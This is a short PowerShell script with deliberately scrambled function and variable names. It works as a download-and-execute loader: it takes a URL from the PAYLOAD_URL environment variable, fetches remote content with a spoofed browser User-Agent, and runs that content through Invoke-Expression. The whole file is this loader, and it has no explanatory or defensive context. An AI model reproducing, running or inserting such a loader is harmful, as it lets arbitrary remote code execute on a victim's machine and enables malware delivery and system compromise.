function XhYjVwJtKz {
    param (
        [string]$AaBbCcDdEe
    )

    try {
        $httpClient = New-Object System.Net.Http.HttpClient
        $httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        return $httpClient.GetStringAsync($AaBbCcDdEe).Result
    }
    catch {
        Write-Host "Error: Failed to fetch data from URL - $AaBbCcDdEe"
        return $null
    }
}

function XoRpQkZtLs {
    param (
        [string]$scriptContent
    )

    try {
        Invoke-Expression $scriptContent  
    }
    catch {
        Write-Host "Error: Failed to execute PowerShell command."
    }
}

$QwErTyUuOo = $env:PAYLOAD_URL  

if ($QwErTyUuOo) {
    $VvWwXxYyZz = XhYjVwJtKz -AaBbCcDdEe $QwErTyUuOo

    if ($VvWwXxYyZz) {
        XoRpQkZtLs -scriptContent $VvWwXxYyZz
    } else {
        Write-Host "Error: No valid data received from the URL."
    }
} else {
    Write-Host "Error: PAYLOAD_URL is not set."
}


